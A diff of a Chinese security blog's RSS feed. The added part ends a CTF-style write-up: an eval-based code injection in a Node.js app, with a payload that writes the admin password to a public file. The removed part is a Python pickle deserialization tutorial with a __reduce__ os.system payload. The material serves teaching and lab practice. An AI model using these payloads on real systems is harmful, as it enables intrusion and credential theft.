punctuation&#34;&gt;.&lt;/span&gt;username&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; your id is: &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;user&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;id&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39; your password is: &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;md5(&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;user&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;password&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;)&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;76&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;77&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;		ctx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;render&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;78&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;79&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;80&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;module&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exports &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; router&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在查看 userid 的地方可以看到这样一句&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;ctx.body=&#39;&amp;lt;h3&amp;gt;Hello &#39;+user[0].username+&#39;&amp;lt;/h3&amp;gt; your name is: &#39;+user[0].username+&#39; your id is: &#39;+user[0].id+ &#39; your password is: &#39;+eval(&#39;md5(&#39;+user[0].password+&#39;)&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里代码注入，闭合前后内容，进行一个代码执行，这里因为代码中 you are not admin，肯定是要拿到一个管理员的权限，或者是拿到管理员的账号&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720185955618.png&#34; alt=&#34;image-20230720185955618&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里它是连接数据库的类，构造一个查询，获取管理员的密码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;2);const init=async()=&amp;gt;&amp;#123;await User.sequelize.query(&amp;quot;select password from Users where username=&#39;admin&#39; into outfile &#39;/app/public/1.txt&#39;;&amp;quot;,&amp;#123;type:User.sequelize.SELECT&amp;#125;);&amp;#125;;init(
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;将其作为密码注册账号，然后访问 user/10&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720190129093.png&#34; alt=&#34;image-20230720190129093&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;接着访问 1.txt&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230720190223493.png&#34; alt=&#34;image-20230720190223493&#34; /&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://blog.xcu.icu/2023/07/19/Hacker_Kid-v1.0.1%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</guid>
             <title>Hacker_Kid-v1.0.1靶机打靶记录</title>
@@ -7000,373 +9545,6 @@ namespace &amp;#123;
 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;换一个链子就行&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://blog.xcu.icu/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
-            <title>python的序列化和反序列化</title>
-            <link>https://blog.xcu.icu/2023/03/08/python%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
-            <category term="Python" scheme="https://blog.xcu.icu/categories/Python/" />
-            <category term="Python" scheme="https://blog.xcu.icu/tags/Python/" />
-            <pubDate>Wed, 08 Mar 2023 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h2 id=&#34;python的序列化和反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python的序列化和反序列化&#34;&gt;#&lt;/a&gt; python 的序列化和反序列化&lt;/h2&gt;
-&lt;p&gt;​	程序运行的过程中，所有对象都是在内存中操作的，当程序一旦执行完毕，对象占有的内存会被收回，如果我们想重复调用这些对象就需要将这些对象持久化储存到内存中，下次运行的时候直接读取相关数据，我们将对象从内存中变成可以持久化储存的数据的过程称为序列化&lt;/p&gt;
-&lt;h3 id=&#34;可序列化的对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可序列化的对象&#34;&gt;#&lt;/a&gt; 可序列化的对象&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;整数、浮点数、复数&lt;/li&gt;
-&lt;li&gt;str、byte、bytearray&lt;/li&gt;
-&lt;li&gt;只包含可封存对象的集合，包括 tuple、list、set 和 dict&lt;/li&gt;
-&lt;li&gt;定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）&lt;/li&gt;
-&lt;li&gt;定义在模块最外层的内置函数&lt;/li&gt;
-&lt;li&gt;定义在模块最外层的类&lt;/li&gt;
-&lt;li&gt;None、True 和 False&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;pickle库和函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pickle库和函数&#34;&gt;#&lt;/a&gt; pickle 库和函数&lt;/h2&gt;
-&lt;p&gt;pickle 是 python 语言的一个标准模块，实现了基本数据的序列化和反序列化&lt;br /&gt;
- dumps	将对象反序列化为 bytes 对象&lt;br /&gt;
- dump	将对象反序列化到文件对象，存入文件&lt;/p&gt;
-&lt;p&gt;loads	对 bytes 对象进行反序列化&lt;br /&gt;
- load	通过对象反序列化，从文件中读取数据&lt;/p&gt;
-&lt;p&gt;首先通过几个例子来看一下几个函数的作用&lt;/p&gt;
-&lt;p&gt;dump/load&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#序列化
-pickle.dump(obj, file, protocol=None,)
-obj表示要进行封装的对象(必填参数）
-file表示obj要写入的文件对象
-以二进制可写模式打开即wb(必填参数）
-#反序列化
-pickle.load(file, *, fix_imports=True, encoding=&amp;quot;ASCII&amp;quot;, errors=&amp;quot;strict&amp;quot;, buffers=None)
-file文件中读取封存后的对象
-以二进制可读模式打开即rb(必填参数)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import pickle
-import pickletools
-import os
-
-class test(object):
-    def __init__(self):
-        self.value1=&#39;abc1&#39;
-        self.value2=&#39;abc2&#39;
-
-x=test()
-file=open(&#39;1.txt&#39;,&#39;wb&#39;)
-y=pickle.dump(x,file)
-print(file)
-file.close()
-file1=open(&#39;1.txt&#39;,&#39;rb&#39;)
-z=pickle.load(file1)
-print(z)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#序列化
-pickle.dumps(obj, protocol=None,*,fix_imports=True)
-dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。
-#反序列化
-pickle.loads(bytes_object, *,fix_imports=True, encoding=&amp;quot;ASCII&amp;quot;. errors=&amp;quot;strict&amp;quot;)
-loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import pickle
-import pickletools
-import os
-
-class test(object):
-    def __init__(self):
-        self.value1=&#39;a&#39;
-        self.value2=&#39;b&#39;
-
-x=test()
-y=pickle.dumps(x)
-print(y)
-z=pickle.loads(y)
-print(z)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820152155604.png&#34; alt=&#34;image-20220820152155604&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;从上面两个例子可以知道 python 怎么实现序列化和反序列的操作，接下来记录序列化后的字符串是的含义&lt;/p&gt;
-&lt;h2 id=&#34;pvm&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pvm&#34;&gt;#&lt;/a&gt; PVM&lt;/h2&gt;
-&lt;p&gt;Python 是一个名为解释器的软件包，解释器是可以让程序运行起来的一套程序，具有独立性，当我们运行一个 python 程序的时候会执行两个步骤&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;先将将源码编译成字节码（字节码是 python 特有的一种表现形式，需要进一步编译才能被机器执行，如果 python 进程在主机上面有写入权限，那么它会吧程序字节码保存为一个.pyc 为扩展名的文件，如果没用则在内存中生成字节码在程序执行结束后被自动抛弃）&lt;/li&gt;
-&lt;li&gt;python 程序将编译好的字节码转发到 PVM（python 虚拟机）中，PVM 会循环迭代执行字节码码指令&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;(&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0cxMDExL2FydGljbGUvZGV0YWlscy8xMDI5MDg4ODY=&#34;&gt;https://blog.csdn.net/G1011/article/details/102908886&lt;/span&gt;)&lt;/p&gt;
-&lt;h2 id=&#34;pvm和pickle的关系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pvm和pickle的关系&#34;&gt;#&lt;/a&gt; PVM 和 Pickle 的关系&lt;/h2&gt;
-&lt;p&gt;pickle 是一门基于栈的编程语言，有不同的编程方式，其本质就是一个轻量级的 PVM&lt;/p&gt;
-&lt;p&gt;这个轻量级的 PVM 由三部分组成及功能：&lt;/p&gt;
-&lt;p&gt;指令处理器：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;从数据流中读取操作码和参数，并对其进行解释处理，之时处理器会循环这个过程，不断改变栈区（stack）和标签区（memo）区域的值，知道遇到.结束。这时最终停留在栈顶的值将会被作为反序列化对象返回
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;栈区（stack）：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;由python的列表（list）实现，作为流数据处理过程中的暂存区，在不断的进出栈过程中完成对数据流的反序列化操作，并最终在栈顶生成反序列化的结果
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;标签区（memo）：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;由python的字典（dict）实现，可以看作是数据索引或者标记，为PVM的整个生命周期提供储存功能
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;python2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python2&#34;&gt;#&lt;/a&gt; python2&lt;/h3&gt;
-&lt;p&gt;几个比较重要的操作码：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;c: 读取本行的内容作为模块名（module）, 读取下一行的内容作为对象名object，然后将 module.object作为可调用对象压入到栈中
-(: 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 t 指令一起使用 , 以便产生一个元组
-S: 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中
-t: 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中
-R: 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用对象的参数并执行该对象 。最后将结果压入到栈中
-.: 结束整个 Pickle反序列化过程
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code&gt;ccopy_reg 			#引入copy_reg模块
-_reconstructor 		#引入_reconstructor对象
-p0 					#p:将栈顶数据(copy_reg._reconstructor)存储在memo中，0是编号
-(c__main__ 			#引入__main__模块
-test				#引入test对象
-p1					#将栈顶数据(__main__.test)存储在memo中，1是编号
-c__builtin__		#引入__builtin__模块
-object				#引入object对象
-p2					#将栈顶数据(__builtin__.object)存储在memo中，2是编号
-Ntp3				#依次从栈中弹出数据直到(，此时弹出的数据组成一个元组，最后将该元组入栈
-Rp4					#将元组和可调用对象全部弹出并执行，将结果压入栈顶，然后将栈顶数据存储在memo中
-					#这里便完成了所有需要的模块和类对象的调用
-(dp5				#在栈顶创建一个字典，将memo中的内容转换成键值对并存储在这个字典中
-					#然后栈顶(这个字典)存储在memo中，5是编号
-S&#39;value2&#39;			#创建字符串&#39;value2&#39;
-p6					#存储在memo中
-S&#39;b&#39;				#创建字符串’b‘
-p7					#存储在memo中
-sS&#39;value1&#39;			#s:将&#39;value2&#39;:&#39;b&#39;作为键值对添加到字典中，创建字符串&#39;value1&#39;
-p8					#存储在memo中
-S&#39;a&#39;				#创建字符串&#39;a&#39;
-p9					#存储在memo中
-sb.					#将&#39;value1&#39;:&#39;a&#39;作为键值对添加到字典中,b:调用setstate或者dic.update()更新字典内容
-					#读取到.结束pickle序列化过程
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2NvcHlfcmVnLmh0bWw=&#34;&gt;copy_reg&lt;/span&gt; 模块，提供了在 pickle 或是 copy 特定对象时，可以运行一个指定的函数，作为对象的构造器&lt;/p&gt;
-&lt;h3 id=&#34;python3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python3&#34;&gt;#&lt;/a&gt; python3&lt;/h3&gt;
-&lt;p&gt;python 运行结果与 python2 不同，这里只有 picpletools&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820163443278.png&#34; alt=&#34;image-20220820163443278&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;0x80：机器看到这个操作符，立刻再去字符串读取一个字节，得到 x04。解释为 “这是一个依据 4 号协议序列化的字符串”，这个操作结束。&lt;br /&gt;
-\x8c：创建（引入）对象&lt;/p&gt;
-&lt;p&gt;)：向栈中压入一个空数组&lt;br /&gt;
- \x81：从栈空间弹出一个类和参数，并用这个参数实例化这个弹出来的类，最终把实例化的类再次压回栈中。&lt;br /&gt;
-}：压入一个空的字典&lt;br /&gt;
- (：向栈中压入一个 MARK 标记&lt;br /&gt;
- X/V：实例化一个字符串&lt;br /&gt;
- u：以键值对的形式进行数据组合（组合的数据为当前栈空间位置到上一个 MARK 之间的数据），并全部添加或更新到该 MARK 之前的一个字典中&lt;br /&gt;
- b：利用填充好的字典和实例化好的对象进行属性赋值。&lt;br /&gt;
-. STOP 简单易懂，结束序列化。&lt;/p&gt;
-&lt;h2 id=&#34;pickle反序列化漏洞分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pickle反序列化漏洞分析&#34;&gt;#&lt;/a&gt; pickle 反序列化漏洞分析&lt;/h2&gt;
-&lt;p&gt;常见 python 反序列化漏洞出现在__educe__() 魔法函数上，这个函数与 PHP 中的__wakeup（）魔术方法类似，都是因为每当反序列化时自动调用&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import pickle
-import os
-import pickletools
-
-class test(object):
-    def __init__(self):
-        self.value1=&#39;abc1&#39;
-        self.value2=&#39;abc2&#39;
-
-    def __reduce__(self):
-        ls=&amp;quot;dir&amp;quot;
-        return (os.system,(ls,))
-
-user = test()
-y = pickle.dumps(user)
-y = pickletools.optimize(y)
-print(y)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820162806423.png&#34; alt=&#34;image-20220820162806423&#34; /&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import pickle
-payload=b&#39;\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x8c\x06system\x93\x8c\x03dir\x85R.&#39;
-pickle.loads(payload)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820162837675.png&#34; alt=&#34;image-20220820162837675&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里成功执行了系统命令&lt;/p&gt;
-&lt;h2 id=&#34;opcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#opcode&#34;&gt;#&lt;/a&gt; opcode&lt;/h2&gt;
-&lt;p&gt;如果需要一次执行多个函数，那么 opcode 尤为重要&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;opcode&lt;/th&gt;
-&lt;th&gt;描述&lt;/th&gt;
-&lt;th&gt;具体写法&lt;/th&gt;
-&lt;th&gt;栈上的变化&lt;/th&gt;
-&lt;th&gt;memo 上的变化&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;c&lt;/td&gt;
-&lt;td&gt;获取一个全局对象或 import 一个模块（注：会调用 import 语句，能够引入新的包）&lt;/td&gt;
-&lt;td&gt;c[module]\n[instance]\n&lt;/td&gt;
-&lt;td&gt;获得的对象入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;o&lt;/td&gt;
-&lt;td&gt;寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象）&lt;/td&gt;
-&lt;td&gt;o&lt;/td&gt;
-&lt;td&gt;这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;i&lt;/td&gt;
-&lt;td&gt;相当于 c 和 o 的组合，先获取一个全局函数，然后寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）&lt;/td&gt;
-&lt;td&gt;i[module]\n[callable]\n&lt;/td&gt;
-&lt;td&gt;这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;N&lt;/td&gt;
-&lt;td&gt;实例化一个 None&lt;/td&gt;
-&lt;td&gt;N&lt;/td&gt;
-&lt;td&gt;获得的对象入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;S&lt;/td&gt;
-&lt;td&gt;实例化一个字符串对象&lt;/td&gt;
-&lt;td&gt;S&#39;xxx&#39;\n（也可以使用双引号、&#39; 等 python 字符串形式）&lt;/td&gt;
-&lt;td&gt;获得的对象入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;V&lt;/td&gt;
-&lt;td&gt;实例化一个 UNICODE 字符串对象&lt;/td&gt;
-&lt;td&gt;Vxxx\n&lt;/td&gt;
-&lt;td&gt;获得的对象入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;I&lt;/td&gt;
-&lt;td&gt;实例化一个 int 对象&lt;/td&gt;
-&lt;td&gt;Ixxx\n&lt;/td&gt;
-&lt;td&gt;获得的对象入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;F&lt;/td&gt;
-&lt;td&gt;实例化一个 float 对象&lt;/td&gt;
-&lt;td&gt;Fx.x\n&lt;/td&gt;
-&lt;td&gt;获得的对象入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;R&lt;/td&gt;
-&lt;td&gt;选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数&lt;/td&gt;
-&lt;td&gt;R&lt;/td&gt;
-&lt;td&gt;函数和参数出栈，函数的返回值入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;.&lt;/td&gt;
-&lt;td&gt;程序结束，栈顶的一个元素作为 pickle.loads () 的返回值&lt;/td&gt;
-&lt;td&gt;.&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;(&lt;/td&gt;
-&lt;td&gt;向栈中压入一个 MARK 标记&lt;/td&gt;
-&lt;td&gt;(&lt;/td&gt;
-&lt;td&gt;MARK 标记入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;t&lt;/td&gt;
-&lt;td&gt;寻找栈中的上一个 MARK，并组合之间的数据为元组&lt;/td&gt;
-&lt;td&gt;t&lt;/td&gt;
-&lt;td&gt;MARK 标记以及被组合的数据出栈，获得的对象入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;)&lt;/td&gt;
-&lt;td&gt;向栈中直接压入一个空元组&lt;/td&gt;
-&lt;td&gt;)&lt;/td&gt;
-&lt;td&gt;空元组入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;l&lt;/td&gt;
-&lt;td&gt;寻找栈中的上一个 MARK，并组合之间的数据为列表&lt;/td&gt;
-&lt;td&gt;l&lt;/td&gt;
-&lt;td&gt;MARK 标记以及被组合的数据出栈，获得的对象入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;]&lt;/td&gt;
-&lt;td&gt;向栈中直接压入一个空列表&lt;/td&gt;
-&lt;td&gt;]&lt;/td&gt;
-&lt;td&gt;空列表入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;d&lt;/td&gt;
-&lt;td&gt;寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对）&lt;/td&gt;
-&lt;td&gt;d&lt;/td&gt;
-&lt;td&gt;MARK 标记以及被组合的数据出栈，获得的对象入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;}&lt;/td&gt;
-&lt;td&gt;向栈中直接压入一个空字典&lt;/td&gt;
-&lt;td&gt;}&lt;/td&gt;
-&lt;td&gt;空字典入栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;p&lt;/td&gt;
-&lt;td&gt;将栈顶对象储存至 memo_n&lt;/td&gt;
-&lt;td&gt;pn\n&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;td&gt;对象被储存&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;g&lt;/td&gt;
-&lt;td&gt;将 memo_n 的对象压栈&lt;/td&gt;
-&lt;td&gt;gn\n&lt;/td&gt;
-&lt;td&gt;对象被压栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;0&lt;/td&gt;
-&lt;td&gt;丢弃栈顶对象&lt;/td&gt;
-&lt;td&gt;0&lt;/td&gt;
-&lt;td&gt;栈顶对象被丢弃&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;b&lt;/td&gt;
-&lt;td&gt;使用栈中的第一个元素（储存多个属性名：属性值的字典）对第二个元素（对象实例）进行属性设置&lt;/td&gt;
-&lt;td&gt;b&lt;/td&gt;
-&lt;td&gt;栈上第一个元素出栈&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;s&lt;/td&gt;
-&lt;td&gt;将栈的第一个和第二个对象作为 key-value 对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中&lt;/td&gt;
-&lt;td&gt;s&lt;/td&gt;
-&lt;td&gt;第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;u&lt;/td&gt;
-&lt;td&gt;寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中&lt;/td&gt;
-&lt;td&gt;u&lt;/td&gt;
-&lt;td&gt;MARK 标记以及被组合的数据出栈，字典被更新&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;a&lt;/td&gt;
-&lt;td&gt;将栈的第一个元素 append 到第二个元素 (列表) 中&lt;/td&gt;
-&lt;td&gt;a&lt;/td&gt;
-&lt;td&gt;栈顶元素出栈，第二个元素（列表）被更新&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;e&lt;/td&gt;
-&lt;td&gt;寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中&lt;/td&gt;
-&lt;td&gt;e&lt;/td&gt;
-&lt;td&gt;MARK 标记以及被组合的数据出栈，列表被更新&lt;/td&gt;
-&lt;td&gt;无&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;h4 id=&#34;拼接opcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#拼接opcode&#34;&gt;#&lt;/a&gt; 拼接 opcode&lt;/h4&gt;
-&lt;p&gt;将第一个 pickle 流结尾表示结束的。去掉，将第二个 pickle 流与第一个拼接起来即可。&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
